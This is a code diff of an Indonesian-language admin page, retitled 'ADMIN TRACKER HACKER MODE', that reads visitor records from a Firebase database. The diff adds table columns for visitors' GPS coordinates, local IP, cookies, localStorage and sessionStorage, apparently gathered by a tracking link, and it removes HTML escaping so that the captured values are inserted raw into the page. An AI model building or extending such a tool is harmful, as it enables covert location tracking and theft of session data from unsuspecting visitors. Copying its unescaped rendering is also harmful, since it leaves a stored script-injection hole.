@@ -6,21 +6,47 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    table { border-collapse: collapse; width: 100%; }
-    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
-    th { background: #eee; }
+    body {
+      font-family: monospace;
+      background-color: black;
+      color: #00FF00;
+      padding: 20px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      color: #00FF00;
+    }
+    th, td {
+      border: 1px solid #00FF00;
+      padding: 6px;
+      text-align: left;
+    }
+    th {
+      background-color: #003300;
+    }
+    h1 {
+      color: #00FF00;
+    }
   </style>
 </head>
 <body>
-  <h1>Admin Pengelola Informasi Tracker Link</h1>
+  <h1>ADMIN TRACKER HACKER MODE</h1>
   <table>
     <thead>
       <tr>
         <th>Waktu</th>
-        <th>IP Address</th>
+        <th>IP Publik</th>
+        <th>IP Lokal</th>
         <th>User Agent</th>
         <th>Referer</th>
+        <th>Latitude</th>
+        <th>Longitude</th>
+        <th>Akurasi</th>
+        <th>Cookies</th>
+        <th>LocalStorage</th>
+        <th>SessionStorage</th>
       </tr>
     </thead>
     <tbody id="data-list"></tbody>
@@ -28,47 +54,43 @@
 
   <script>
     const firebaseConfig = {
-  apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
-  authDomain: "xr-social-53646.firebaseapp.com",
-  databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "xr-social-53646",
-  storageBucket: "xr-social-53646.firebasestorage.app",
-  messagingSenderId: "55685443011",
-  appId: "1:55685443011:web:ef0f9de8e329d24d512176",
-  measurementId: "G-LTMZD79ZWX"
+      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
+      authDomain: "xr-social-53646.firebaseapp.com",
+      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "xr-social-53646",
+      storageBucket: "xr-social-53646.appspot.com",
+      messagingSenderId: "55685443011",
+      appId: "1:55685443011:web:ef0f9de8e329d24d512176",
+      measurementId: "G-LTMZD79ZWX"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    function escapeHtml(text) {
-      return text
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
-    }
-
     const dataList = document.getElementById('data-list');
 
     db.ref('visitors').on('value', snapshot => {
       dataList.innerHTML = '';
       const data = snapshot.val();
       if (!data) {
-        dataList.innerHTML = '<tr><td colspan="4">Belum ada data pengunjung</td></tr>';
+        dataList.innerHTML = '<tr><td colspan="11">Belum ada data pengunjung</td></tr>';
         return;
       }
 
-      Object.keys(data).forEach(key => {
-        const entry = data[key];
+      Object.keys(data).reverse().forEach(key => {
+        const e = data[key];
         const row = document.createElement('tr');
-
         row.innerHTML = `
-          <td>${escapeHtml(new Date(entry.timestamp).toLocaleString())}</td>
-          <td>${escapeHtml(entry.ip || 'Tidak tersedia')}</td>
-          <td>${escapeHtml(entry.userAgent || 'Tidak tersedia')}</td>
-          <td>${escapeHtml(entry.referer || 'Tidak tersedia')}</td>
+          <td>${e.timestamp}</td>
+          <td>${e.ip || ''}</td>
+          <td>${e.localIP || ''}</td>
+          <td>${e.userAgent}</td>
+          <td>${e.referer}</td>
+          <td>${e.latitude}</td>
+          <td>${e.longitude}</td>
+          <td>${e.accuracy}</td>
+          <td>${e.cookies}</td>
+          <td>${e.localStorage}</td>
+          <td>${e.sessionStorage}</td>
         `;
         dataList.appendChild(row);
       });
